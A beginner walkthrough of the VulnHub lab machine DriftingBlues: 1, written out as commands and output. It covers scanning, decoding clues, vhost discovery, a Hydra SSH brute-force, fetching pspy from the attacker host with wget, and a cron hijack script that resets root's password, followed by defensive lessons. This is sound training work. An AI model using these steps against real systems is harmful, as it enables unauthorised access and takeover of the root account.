# DriftingBlues: 1 — VulnHub Walkthrough (Beginner Friendly)

> **Educational writeup.** Run this VM only on an isolated, host-only lab network.
> The goal is to understand *why* each step works, not just to copy commands.

| Field | Value |
| --- | --- |
| **Machine** | DriftingBlues: 1 |
| **Difficulty** | Easy |
| **Author** | tasiyanci |
| **Released** | 11 December 2020 |
| **VulnHub Entry** | <https://vulnhub.com/entry/driftingblues-1,625/> |
| **Download** | <https://vulnhub.com/entry/driftingblues-1,625/#download> |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux (Debian/Ubuntu-based, Apache + PHP) |

> **Note:** the VM is exported from VirtualBox with DHCP enabled. Filenames, the
> password and the flag strings **vary by build**, so treat every output below as
> *illustrative* and confirm against your own target.

---

## 0. What you will learn

- How to find a host with `netdiscover`/`arp-scan` and scan it with Nmap.
- How to read a web page's **source code** and decode a **base64** string for a clue.
- How to recognise and decode an **esoteric language** (Ook!) to recover a hint.
- How **virtual-host (vhost) enumeration** reveals extra websites on one IP.
- How `robots.txt` can leak a "secret" file path.
- How recovered usernames + a partial password (plus a range of digits) feed a
  **Hydra SSH brute-force**.
- How a **cron job running `sudo`** on a file in a world-writable directory leads to root.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You need Kali running and the ability to import
an OVA and attach it to a host-only network.

---

## 1. Reconnaissance — finding the target

> **Goal:** find the target's IP address on your isolated lab network.

```bash
# See your own IP / lab subnet first
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **How to read it:** your Kali box holds a `192.168.56.x` (VirtualBox host-only) or
> `192.168.19x.x` (VMware) address. The target is on the **same** subnet.

```bash
# netdiscover listens for ARP traffic and lists live hosts
sudo netdiscover -i eth0 -r 192.168.56.0/24
```

```text
 Currently scanning: Finished!   |   Screen View: Unique Hosts
 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.56.1    08:00:27:xx:xx:xx      1      60  PCS Systemtechnik GmbH
 192.168.56.10   08:00:27:aa:aa:aa      1      60  PCS Systemtechnik GmbH
 192.168.56.101  08:00:27:bb:bb:bb      1      60  PCS Systemtechnik GmbH
```

**Target IP:** `192.168.56.101`

![netdiscover finding the target](images/01-recon.png)

---

## 2. Enumeration

### 2.1 Port scanning

```bash
# Full TCP sweep + service/version + default scripts
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
sudo nmap -sC -sV -p 22,80 -oA scans/services 192.168.56.101
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 (Ubuntu)
|_http-title: Drifting Blues
```

> **Why it works:** `-p-` scans all 65,535 TCP ports; `-sV` fingerprints each service;
> `-sC` runs Nmap's safe scripts. We have a web server (80) and SSH (22).

![nmap scan of the target](images/02-nmap.png)

### 2.2 The front page and its source

Browse `http://192.168.56.101/`. It's a small "company" page. Two things stand out:

1. Two email addresses of staff members (e.g. `sheryl@driftingblues.box` and
   `eric@driftingblues.box`). **Save these — usernames matter later.**
2. A **base64** string hidden in the page source (`Ctrl+U` in the browser).

![Two staff emails and a base64 blob in the source](images/03-source-base64.png)

```bash
# Decode whatever base64 you found in the source
echo '<the-base64-string-from-the-source>' | base64 -d
```

```text
<the-name-of-a-text-file.txt>      # e.g. a small .txt file (varies by build)
```

> **Why it works:** base64 is *encoding*, not encryption. `base64 -d` (or CyberChef)
> trivially reverses it. The decoded value names a file to fetch next.

```bash
# Fetch the file the decoded string pointed to
curl -s http://192.168.56.101/<the-file>.txt
```

```text
Ook. Ook? Ook! Ook! Ook. Ook? ...      # looks like gibberish — it's a language!
```

### 2.3 Decoding the esoteric language

That gibberish is **Ook!**, an esoteric programming language built from the words
`Ook.`, `Ook?` and `Ook!`. Paste it into any online Ook!/Brainfuck translator.

```text
my man, i know you are new but you should know how to use host file
to reach our secret location. ~eric
```

> **Why it works:** esoteric languages are just another encoding. Recognising the
> shape (`Ook.` repeated) and running it through the right decoder recovers plain text.
> The hint says the answer is a **virtual host** — so we look for one.

![Decoding the Ook! file to a hint](images/04-ook-decode.png)

### 2.4 Virtual-host enumeration

```bash
# The hint is about "host files", so look for hidden vhosts on the same IP
gobuster vhost -u http://192.168.56.101/ -w /usr/share/wordlists/dirb/common.txt \
  --append-domain -d driftingblues.box
```

```text
Found: driftingblues.box        Status: 200
Found: test.driftingblues.box   Status: 200
```

Add both names to Kali's host file so the browser and tools can reach them:

```bash
sudo tee -a /etc/hosts >/dev/null <<'EOF'
192.168.56.101  driftingblues.box
192.168.56.101  test.driftingblues.box
EOF
```

> **Why it works:** one IP can serve many websites, told apart by the `Host:` header.
> `gobuster vhost` tries many names and flags the ones that return `200`. Adding them
> to `/etc/hosts` points the names at the target IP.

Browsing `http://test.driftingblues.box/` shows a "work in progress" page.

![The hidden test.driftingblues.box virtual host](images/05-vhost.png)

### 2.5 Robots.txt leaks a secret path

```bash
gobuster dir -u http://test.driftingblues.box/ \
  -w /usr/share/wordlists/dirb/common.txt -x txt,php,html
curl -s http://test.driftingblues.box/robots.txt
```

```text
User-agent: *
Disallow: /ssh_cred.txt
```

```bash
# robots.txt is a "do not index" list — not access control. Fetch it anyway.
curl -s http://test.driftingblues.box/ssh_cred.txt
```

```text
<something>_<something>   # an SSH password, but the LAST character is missing
                          # ...and the author tells us it is a single number 0-9
```

> **Why it works:** `robots.txt` only asks search engines not to crawl a path — it
> does **not** protect it. Naming a file there advertises it to attackers.

![robots.txt pointing at the credential file](images/06-robots.png)

---

## 3. Foothold

### 3.1 Building the password list

We have two usernames (`sheryl`, `eric`) and a password whose final **digit** we don't
know. Only ten possibilities — generate them:

```bash
# users.txt
printf 'sheryl\neric\n' > users.txt

# pass.txt: the known prefix + each digit 0-9
PREFIX='<password_without_last_char>'
for i in 0 1 2 3 4 5 6 7 8 9; do echo "${PREFIX}${i}"; done > pass.txt
cat pass.txt
```

```text
<prefix>0
<prefix>1
<prefix>2
...
<prefix>9
```

> **Why it works:** the search space is tiny (2 users × 10 passwords = 20 attempts).
> This is why any *partial* leak of a password is still a full compromise.

### 3.2 Hydra SSH brute-force

```bash
hydra -L users.txt -P pass.txt ssh://192.168.56.101 -t 4
```

```text
[22][ssh] host: 192.168.56.101   login: eric   password: <prefix><n>
1 of 1 target successfully completed, 1 valid password found
```

> **Why it works:** Hydra tries each username/password pair against `sshd`. There is no
> account lockout and the password space is tiny, so it succeeds in seconds.

```bash
ssh eric@192.168.56.101
```

```text
eric@driftingblues:~$
```

### 3.3 The user flag

```bash
id
ls -la
cat user.txt
```

```text
uid=1000(eric) gid=1000(eric) groups=1000(eric)
<the user flag — varies by build>
```

![Shell as eric and the user flag](images/07-user-flag.png)

---

## 4. Privilege escalation

### 4.1 Enumerate for cron / privileged jobs

```bash
sudo -l
cat /etc/crontab; ls -la /etc/cron*
id; uname -a
```

Directly reading cron may show nothing, because the job belongs to **root**. Use `pspy`
(no root needed) to *watch* processes as they run:

```bash
# On Kali: serve the tool
python3 -m http.server 8080    # in the dir containing pspy64

# On the target:
wget http://192.168.56.10:8080/pspy64 -O /tmp/pspy64
chmod +x /tmp/pspy64
/tmp/pspy64
```

```text
CMD: UID=0  PID=1234  | /bin/sh /var/backups/backup.sh
CMD: UID=0  PID=1235  | sudo /tmp/emergency
```

> **Why it works:** `pspy` watches `procfs` events and prints every new process —
> including ones started by **root's** cron. The last line is the jackpot: root runs
> `sudo /tmp/emergency` every minute.

Let's confirm what the backup script does:

```bash
cat /var/backups/backup.sh
```

```text
#!/bin/bash
zip -r -0 /tmp/backup.zip /var/www/
sudo /tmp/emergency      # <-- runs as root, from a directory anyone can write to
```

The directory `/tmp` is world-writable and the file it calls **does not exist yet**:

```bash
ls -la /tmp/emergency
```

```text
ls: cannot access '/tmp/emergency': No such file or directory
```

> **Why it works:** classic **cron / PATH hijack** pattern. Root blindly executes a
> path we can create. Anything we put at `/tmp/emergency` runs as root on the next tick.

![pspy revealing the root cron job](images/08-pspy-cron.png)

### 4.2 Hijacking the cron job

```bash
# Create the file root is looking for; give it a root password change
cat > /tmp/emergency <<'EOF'
#!/bin/bash
echo -e "pwned\npwned" | passwd root
EOF
chmod +x /tmp/emergency
ls -la /tmp/emergency
```

> **Why it works:** when root's cron fires `sudo /tmp/emergency`, it runs *our* script
> as root. The script pipes a new password (`pwned`) into `passwd root`, resetting the
> root account password.

Wait up to one minute, then log in as root:

```bash
su root
```

```text
Password: pwned
root@driftingblues:/home/eric#
```

```bash
id
cat /root/root.txt
```

```text
uid=0(root) gid=0(root) groups=0(root)
<the root flag — varies by build>
```

> **Tip:** an alternative root path on this box is abusing a `sudo`-able binary with
> GTFOBins. Always run `sudo -l` and check GTFOBins before reaching for exploits.

![Root shell and the root flag](images/09-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Sensitive info encoded (not encrypted) in page source | base64 on the home page | Leads to the secret file + hint |
| 2 | Weak secret placed behind `robots.txt` | `/ssh_cred.txt` | Leaks a (partial) SSH password |
| 3 | Virtual host exposed on the same host | `test.driftingblues.box` | Extra attack surface / hidden app |
| 4 | Partial password + no lockout | SSH (22) | Hydra brute-forces the last digit |
| 5 | Root cron runs an untrusted, writable path | `sudo /tmp/emergency` | Arbitrary code execution as root |
| 6 | `/tmp` writable and trusted by root | `/tmp/emergency` | Root password reset → full compromise |

---

## 6. Defensive lessons (blue team)

- **Encoding is not security.** Never hide secrets in base64 in client-visible files.
- **`robots.txt` is not access control.** Put sensitive files outside the webroot and
  require authentication.
- **Don't run a single IP as many sites without review.** Audit vhosts/certs regularly
  so forgotten staging apps can't be found.
- **Enforce strong, unique passwords** and add **rate limiting / lockout / fail2ban**
  on SSH; disable password auth in favour of keys. This defeats partial-secret guessing.
- **Never run root cron on a world-writable path.** Use root-owned directories with
  strict permissions, absolute paths, and `PATH` set explicitly.
- **Least privilege for cron.** If a job doesn't need root, don't give it root.
- **Monitoring:** alert on root-owned processes launched from `/tmp`, on new files in
  `/tmp` that get executed, and on `passwd`/`shadow` changes outside change windows.

---

## 7. References

- VulnHub entry — DriftingBlues: 1: <https://vulnhub.com/entry/driftingblues-1,625/>
- InfoSec Write-ups — DriftingBlues: 1 Walkthrough:
  <https://infosecwriteups.com/driftingblues-1-vulnhub-write-up-walkthrough-cafcbd6358d>
- `pspy` — monitor processes without root: <https://github.com/DominicBreuker/pspy>
- GTFOBins — living-off-the-land binaries: <https://gtfobins.github.io/>
- OWASP — Insecure Direct Object / information exposure: <https://owasp.org/www-project-top-ten/>
- Hydra — network login brute-forcer: <https://github.com/vanhauser-thc/thc-hydra>
- Ook!/Brainfuck decoder: <https://www.cachesleuth.com/bfook.html>
- CyberChef — the "cyber swiss army knife": <https://gchq.github.io/CyberChef/>

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target with netdiscover/arp-scan
- [ ] `images/02-nmap.png` — port/service scan
- [ ] `images/03-source-base64.png` — emails + base64 in the page source
- [ ] `images/04-ook-decode.png` — decoding the Ook! file to a hint
- [ ] `images/05-vhost.png` — the hidden `test.driftingblues.box` site
- [ ] `images/06-robots.png` — `robots.txt` pointing at the credential file
- [ ] `images/07-user-flag.png` — shell as `eric` and the user flag
- [ ] `images/08-pspy-cron.png` — pspy showing the root cron job
- [ ] `images/09-root-flag.png` — root shell and the root flag

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
